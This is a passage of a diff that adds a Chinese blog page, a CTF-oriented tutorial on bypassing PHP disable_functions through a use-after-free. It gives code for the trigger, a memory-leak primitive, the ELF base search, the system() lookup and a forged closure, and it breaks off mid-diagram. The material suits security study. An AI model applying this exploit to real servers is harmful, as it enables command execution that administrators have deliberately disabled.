@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>PHP UAF漏洞利用详解（Use-After-Free 绕过 disable_functions） | 菜菜のblog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const pagebody = document.getElementsByTagName('body')[0]
+
+            function setTheme(status) {
+
+                if (status === 'dark') {
+                    window.sessionStorage.theme = 'dark'
+                    pagebody.classList.add('dark-theme');
+
+                } else if (status === 'light') {
+                    window.sessionStorage.theme = 'light'
+                    pagebody.classList.remove('dark-theme');
+                }
+            };
+
+            setTheme(window.sessionStorage.theme)
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saisi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saisi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">
+                    <svg class="menu-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M4.5 17.27q-.213 0-.356-.145T4 16.768t.144-.356t.356-.143h15q.213 0 .356.144q.144.144.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.144T4 11.999t.144-.356t.356-.143h15q.213 0 .356.144t.144.357t-.144.356t-.356.143zm0-4.77q-.213 0-.356-.143Q4 7.443 4 7.23t.144-.356t.356-.143h15q.213 0 .356.144T20 7.23t-.144.356t-.356.144z"/></svg>
+                    <svg class="close-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Material Symbols Light by Google - https://github.com/google/material-design-icons/blob/master/LICENSE --><path fill="currentColor" d="m12 12.708l-5.246 5.246q-.14.14-.344.15t-.364-.15t-.16-.354t.16-.354L11.292 12L6.046 6.754q-.14-.14-.15-.344t.15-.364t.354-.16t.354.16L12 11.292l5.246-5.246q.14-.14.345-.15q.203-.01.363.15t.16.354t-.16.354L12.708 12l5.246 5.246q.14.14.15.345q.01.203-.15.363t-.354.16t-.354-.16z"/></svg>
+                </div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                <a class="menu-item" href="/archives">Posts</a>
+                
+                <a class="menu-item" href="/category">Categories</a>
+                
+                <a class="menu-item" href="/tag">Tags</a>
+                
+                <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.classList.contains("active")) {
+            toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        } else {
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP UAF漏洞利用详解（Use-After-Free 绕过 disable_functions）</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 9, 2026&nbsp;&nbsp;12:00:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="一、场景：函数全被禁了怎么办？"><a href="#一、场景：函数全被禁了怎么办？" class="headerlink" title="一、场景：函数全被禁了怎么办？"></a>一、场景：函数全被禁了怎么办？</h2><p>在 CTF 中经常遇到这种情况：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() ❌ 被禁</span><br><span class="line"><span class="title function_ invoke__">exec</span>() ❌ 被禁</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>() ❌ 被禁</span><br><span class="line"><span class="title function_ invoke__">passthru</span>() ❌ 被禁</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>() ❌ 被禁  （受 open_basedir 限制）</span><br></pre></td></tr></table></figure>
+
+<p>连读文件都做不到，怎么拿 flag？<strong>UAF 漏洞脚本</strong>可以解决这个问题。</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="二、前置知识"><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h2><h3 id="2-1-PHP-是-C-语言写的"><a href="#2-1-PHP-是-C-语言写的" class="headerlink" title="2.1 PHP 是 C 语言写的"></a>2.1 PHP 是 C 语言写的</h3><p>PHP 解释器（Zend Engine）是用 <strong>C 语言</strong>开发的。这意味着 PHP 内部有：</p>
+<ul>
+<li>指针、内存地址</li>
+<li><code>malloc</code>&#x2F;<code>free</code> 手动内存管理</li>
+<li>C 语言的各类潜在漏洞（包括 UAF）</li>
+</ul>
+<h3 id="2-2-disable-functions-是在哪一层实现的？"><a href="#2-2-disable-functions-是在哪一层实现的？" class="headerlink" title="2.2 disable_functions 是在哪一层实现的？"></a>2.2 <code>disable_functions</code> 是在哪一层实现的？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">你写的 PHP 代码</span><br><span class="line">    ↓</span><br><span class="line">① Zend Engine 解析执行</span><br><span class="line">    ↓</span><br><span class="line">② 函数调用检查 ← disable_functions 在这里！</span><br><span class="line">    ↓</span><br><span class="line">③ C 函数实际执行 ← system() 的 C 代码在这里</span><br><span class="line">    ↓</span><br><span class="line">操作系统</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键：<code>disable_functions</code> 只是在函数表条目上打了一个”禁用”标记（<code>is_disabled = true</code>），并没有把 <code>system()</code> 的 C 代码从内存中删除。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP 函数表（内存中）:</span><br><span class="line">┌─────────────────────────────────────┐</span><br><span class="line">│ &quot;system&quot;   → C函数地址: 0x7f123456 │  ← 代码还在！</span><br><span class="line">│   is_disabled = true                │  ← 只是一个标记</span><br><span class="line">│                                     │</span><br><span class="line">│ &quot;exec&quot;     → C函数地址: 0x7f123457 │</span><br><span class="line">│   is_disabled = true                │</span><br><span class="line">│                                     │</span><br><span class="line">│ &quot;strlen&quot;   → C函数地址: 0x7f123458 │</span><br><span class="line">│   is_disabled = false               │</span><br><span class="line">└─────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>类比电话簿：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system() → 电话号码还在（C 函数地址还在内存中）</span><br><span class="line">           但被标记为&quot;禁用&quot; → 接线员不帮你接通</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="2-3-PHP-闭包（Closure）的内部结构"><a href="#2-3-PHP-闭包（Closure）的内部结构" class="headerlink" title="2.3 PHP 闭包（Closure）的内部结构"></a>2.3 PHP 闭包（Closure）的内部结构</h3><p>闭包就是匿名函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$x</span> + <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>PHP 内部把闭包实现为一个<strong>对象</strong>，内存布局如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">闭包对象在内存中的结构:</span><br><span class="line">┌─────────────────────────┐</span><br><span class="line">│  type = 0               │ ← 函数类型（0=用户函数, 1=内部函数）</span><br><span class="line">│  handler = 0x7f...      │ ← 指向实际执行的函数指针 ← 关键！</span><br><span class="line">│  ...                    │</span><br><span class="line">│  parameters             │ ← 参数列表</span><br><span class="line">│  ...                    │</span><br><span class="line">└─────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>调用闭包时，PHP 的执行流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$func(&quot;hello&quot;)</span><br><span class="line">    ↓</span><br><span class="line">PHP 看到这是闭包 → 查看 type</span><br><span class="line">    ↓</span><br><span class="line">根据 type 找到对应的 handler</span><br><span class="line">    ↓</span><br><span class="line">调用 handler(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、什么是-UAF（Use-After-Free）"><a href="#三、什么是-UAF（Use-After-Free）" class="headerlink" title="三、什么是 UAF（Use-After-Free）"></a>三、什么是 UAF（Use-After-Free）</h2><h3 id="3-1-C-语言的内存管理"><a href="#3-1-C-语言的内存管理" class="headerlink" title="3.1 C 语言的内存管理"></a>3.1 C 语言的内存管理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *p = <span class="built_in">malloc</span>(<span class="number">100</span>);   <span class="comment">// ① 分配内存（借书）</span></span><br><span class="line"><span class="built_in">strcpy</span>(p, <span class="string">&quot;hello&quot;</span>);       <span class="comment">// ② 使用内存（看书）</span></span><br><span class="line"><span class="built_in">free</span>(p);                  <span class="comment">// ③ 释放内存（还书）</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);          <span class="comment">// ④ 还用旧地址访问！→ USE-AFTER-FREE ❌</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第④步就是 UAF</strong>：内存已经还给系统了，但指针还留着，指向的可能是别人的数据。</p>
+<h3 id="3-2-图书馆类比"><a href="#3-2-图书馆类比" class="headerlink" title="3.2 图书馆类比"></a>3.2 图书馆类比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">① malloc(100)  → 借了一本书            → 手里有地址标签: &quot;书架A-第3排&quot;</span><br><span class="line">② 使用          → 读书</span><br><span class="line">③ free(p)      → 还书                  → 书放回书架</span><br><span class="line">④ UAF          → 按地址标签去找书       → 那本书可能已经被别人借走了</span><br><span class="line">                 读到的可能是别人的笔记！   → 内存数据不可控</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-UAF-是-PHP-特有的吗？"><a href="#3-3-UAF-是-PHP-特有的吗？" class="headerlink" title="3.3 UAF 是 PHP 特有的吗？"></a>3.3 UAF 是 PHP 特有的吗？</h3><p><strong>不是！</strong> UAF 是 C&#x2F;C++ 世界的通用内存漏洞：</p>
+<table>
+<thead>
+<tr>
+<th>软件</th>
+<th>语言</th>
+<th>著名的 UAF 漏洞</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP 7.x</td>
+<td>C</td>
+<td>本脚本利用的 UAF</td>
+</tr>
+<tr>
+<td>Chrome V8</td>
+<td>C++</td>
+<td>无数 UAF</td>
+</tr>
+<tr>
+<td>Linux 内核</td>
+<td>C</td>
+<td>CVE-2021-0920</td>
+</tr>
+<tr>
+<td>Adobe Reader</td>
+<td>C++</td>
+<td>CVE-2018-8653</td>
+</tr>
+</tbody></table>
+<p><strong>因为它们都是 C&#x2F;C++ 写的，都需要手动管理内存。</strong></p>
+<hr>
+<h2 id="四、UAF-脚本原理（逐层拆解）"><a href="#四、UAF-脚本原理（逐层拆解）" class="headerlink" title="四、UAF 脚本原理（逐层拆解）"></a>四、UAF 脚本原理（逐层拆解）</h2><h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">触发 UAF → 泄露内存地址 → 解析 ELF → 搜索函数表 → 伪造闭包 → 执行命令</span><br><span class="line">   ①            ②           ③          ④           ⑤          ⑥</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-1-第一步：触发-UAF"><a href="#4-1-第一步：触发-UAF" class="headerlink" title="4.1 第一步：触发 UAF"></a>4.1 第一步：触发 UAF</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;         <span class="comment">// 对象销毁时自动调用</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);                    <span class="comment">// ① 释放成员变量</span></span><br><span class="line">        <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();  <span class="comment">// ② 获取调用栈</span></span><br><span class="line">        <span class="comment">// $backtrace[1][&#x27;args&#x27;][0] 引用着已释放的内存 ← UAF！</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAA...&#x27;</span>);          <span class="comment">// 分配字符串</span></span><br><span class="line">    <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">    <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;                        <span class="comment">// 指向字符串</span></span><br><span class="line">    <span class="comment">// 函数结束 → $vuln 销毁 → __destruct() 执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">步骤1: $arg = &quot;AAAA...&quot;（分配内存）</span><br><span class="line">步骤2: $vuln-&gt;a = $arg（指向同一块内存）</span><br><span class="line">步骤3: 函数结束 → __destruct() 被调用</span><br><span class="line">步骤4: unset($this-&gt;a) → 释放了 &quot;AAAA...&quot; 的内存（free）</span><br><span class="line">步骤5: $backtrace[1][&#x27;args&#x27;][0] 仍指向已释放的内存 ← UAF 形成！</span><br><span class="line"></span><br><span class="line">内存状态:</span><br><span class="line"> [已释放的内存] ← 标记为空闲，可以被重新分配</span><br><span class="line"> ↑</span><br><span class="line"> $backtrace[1][&#x27;args&#x27;][0] 还指着这里！</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-2-第二步：内存泄露（leak）"><a href="#4-2-第二步：内存泄露（leak）" class="headerlink" title="4.2 第二步：内存泄露（leak）"></a>4.2 第二步：内存泄露（leak）</h3><p>有了 UAF 之后，就可以操作这块”已释放但还被引用着”的内存。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);  <span class="comment">// 写入目标地址到 $abc</span></span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);              <span class="comment">// 读取内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理：</strong> 在可控内存 <code>$abc</code> 中伪造一个 <code>zend_string</code>（PHP 内部字符串结构），把它的指针指向想读的地址，然后通过 <code>strlen()</code> 等函数间接读取该地址的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">伪造的 zend_string:</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│  len                │</span><br><span class="line">│  val (指针) → 目标地址 │  ← 改成想读的内存地址</span><br><span class="line">└─────────────────────┘</span><br><span class="line"></span><br><span class="line">strlen($helper-&gt;a) → PHP 去读 val 指向的地址 → 返回长度 → 泄露了内存内容！</span><br></pre></td></tr></table></figure>
+
+<p><strong>逐级泄露：</strong></p>
+<table>
+<thead>
+<tr>
+<th>泄露目标</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP 堆地址</td>
+<td>确定内存布局</td>
+</tr>
+<tr>
+<td>闭包句柄</td>
+<td>找到 PHP 可执行文件基址</td>
+</tr>
+<tr>
+<td>ELF 头 <code>\x7fELF</code></td>
+<td>确认找到了基址</td>
+</tr>
+<tr>
+<td>函数表</td>
+<td>找到内部函数列表</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="4-3-第三步：找到-PHP-基址和-system"><a href="#4-3-第三步：找到-PHP-基址和-system" class="headerlink" title="4.3 第三步：找到 PHP 基址和 system()"></a>4.3 第三步：找到 PHP 基址和 <code>system()</code></h3><p><strong>1. 搜索 ELF 头确认基址：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;  <span class="comment">// 页对齐</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;             <span class="comment">// 逐页向上搜索</span></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;              <span class="comment">// &quot;\x7fELF&quot; 魔数</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$addr</span>;                           <span class="comment">// 找到基址！</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 解析 ELF 找到数据段：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 读取 ELF 头，找到程序头表（Program Header Table）</span></span><br><span class="line">    <span class="comment">// 遍历所有段，找到 PT_LOAD + PF_Read_Write 的数据段</span></span><br><span class="line">    <span class="comment">// 这个段里存着 PHP 的函数表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 在函数表中搜索 <code>system</code>：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);                     <span class="comment">// 读一个函数条目</span></span><br><span class="line">        <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);             <span class="comment">// 读函数名前6字节</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;              <span class="comment">// &quot;system&quot; 的十六进制表示</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);                  <span class="comment">// 返回 system 的地址！</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += <span class="number">0x20</span>;                               <span class="comment">// 每个函数条目占 0x20 字节</span></span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>“system” 在内存中的样子：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符:  s     y     s     t     e     m</span><br><span class="line">ASCII: 0x73  0x79  0x73  0x74  0x65  0x6d</span><br><span class="line"></span><br><span class="line">在64位小端序内存中：0x6d6574737973</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-4-第四步：伪造闭包"><a href="#4-4-第四步：伪造闭包" class="headerlink" title="4.4 第四步：伪造闭包"></a>4.4 第四步：伪造闭包</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在可控内存中构造伪闭包</span></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));  <span class="comment">// 复制真实闭包</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 篡改关键字段</span></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);       <span class="comment">// type = 1（标记为内部函数）</span></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment">// handler = system() 的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 把闭包指针指向伪对象</span></span><br><span class="line"><span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>篡改前后的对比：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">篡改前（正常闭包）:</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│ type = 0 (用户函数)  │</span><br><span class="line">│ handler = 闭包执行引擎│</span><br><span class="line">│ ...                 │</span><br><span class="line">└─────────────────────┘</span><br><span class="line"></span><br><span class="line">篡改后（伪闭包）:</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│ type = 1 (内部函数)  │  ← 改成内部函数类型</span><br><span class="line">│ handler = system()  │  ← 改成 system 的地址！</span><br><span 